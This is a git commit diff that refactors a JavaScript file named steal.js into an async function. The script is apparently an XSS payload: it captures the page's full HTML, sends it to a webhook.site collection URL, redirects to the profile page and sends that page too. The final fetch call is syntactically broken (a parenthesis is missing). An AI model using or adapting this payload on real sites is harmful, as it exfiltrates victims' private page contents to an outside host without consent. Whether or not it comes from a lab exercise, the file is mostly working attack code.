127e7d6e5b5e87691efdecded2d28a17b4501df5
Dan1e1B <147431777+Dan1e1B@users.noreply.github.com>
2025-12-28 15:13:28 +0000

    Refactor data sending to use async function

--- steal.js
+++ steal.js
@@ -1,6 +1,22 @@
 // 1. Navigate to profile
-fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
-window.location = "/profile";
-fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
-window.location = "/";
-fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML);
+
+async function sendData(){
+
+  try {
+    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
+    console.log("Sucess!");
+    window.location = "/profile";
+    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
+    console.log("Sucess!");
+    window.location = "/";
+    
+    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML);
+    console.log("Sucess!");
+  } catch(error) {
+    console.log(error);
+  }
+}
+
+
+sendData();
+
